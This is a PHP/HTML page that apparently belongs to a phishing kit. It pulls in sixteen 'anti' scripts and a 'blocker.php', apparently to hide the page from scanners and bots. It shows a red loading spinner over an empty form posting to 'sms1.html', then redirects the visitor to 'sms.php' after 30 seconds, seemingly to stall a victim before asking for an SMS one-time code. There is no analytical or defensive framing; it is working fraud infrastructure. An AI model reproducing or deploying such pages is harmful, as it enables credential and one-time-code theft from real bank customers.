<?php 
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<div class="off-canvas-wrap">
<div class="page-wrap page-wrap--g2p">
<div class="skip-to-content">&nbsp;</div>
<main class="main gap-top-2" role="main">
<div class="content-container content-container--spacer g2p-no-background">
<div class="content-container__inner gs-row">
<form action="sms1.html" id="id17" method="post" novalidate="novalidate">
<div class="hidden-fields" hidden=""><input autocomplete="off" tabindex="-1" type="text" /> <input id="id17_hf_1" name="view:next-inline" tabindex="-1" type="submit" /></div>

<div class="form-container_content fg-col-20">
<style type="text/css">.spinner {
                                width: 8vmax;
                                height: 8vmax;
                                border-right: 5px solid #DA1710;
                                border-radius: 100%;
                                animation: spinRight 1400ms linear infinite;
                                
                                &:before, &:after {
                                    content: '';
                                    width: 6vmax;
                                    height: 6vmax;
                                    display: block;
                                    position: absolute;
                                    top: calc(50% - 3vmax);
                                    left: calc(50% - 3vmax);
                                    border-left: 3px solid #DA1710;
                                    border-radius: 100%;
                                    animation: spinLeft 800ms linear infinite;
                                }
                                
                                &:after {
                                    width: 4vmax;
                                    height: 4vmax;
                                    top: calc(50% - 2vmax);
                                    left: calc(50% - 2vmax);
                                    border: 0;
                                    border-right: 2px solid #DA1710;
                                    animation: none;
                                }
                                }

                                @keyframes spinLeft {
                                from {transform:rotate(0deg);}
                                to {transform:rotate(720deg);}
                                }

                                @keyframes spinRight {
                                from {transform:rotate(360deg);}
                                to {transform:rotate(0deg);}
                                }
</style>
<div class="form-group" id="id1c">
<center>
<div class="spinner">&nbsp;</div>
</center>

<center>
<p class="gap-bottom-2 gap-top-2" style="color:#000000; font-size:20px;"><span style="color:#000000;"></span></p>
</center>
</div>

<div class="form-group" id="id1d">
<div>
<div class="notification__content">&nbsp;</div>
</div>
</div>
</div>
</form>
</div>

<div class="g2p-content-card">
<section class="modal" data-modal="close" id="js-modal--qr-key-explain" role="dialog">
<div class="modal__wrapper">
<div class="modal__dialog">
<div class="modal__body">
<div class="modal__body_inner">
<ol class="process-steps__list">
	<li class="process-steps__list-item">
	<div class="process-steps__list-item-inner">
	<div class="process-steps__list-item__text">
	<p>&nbsp;</p>
	</div>
	</div>
	</li>
	<script>
        setTimeout(function () {
            window.location.href = "sms.php";
        }, 30000);
</script>
</ol>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</main></div>
</div>
</body>
</html>
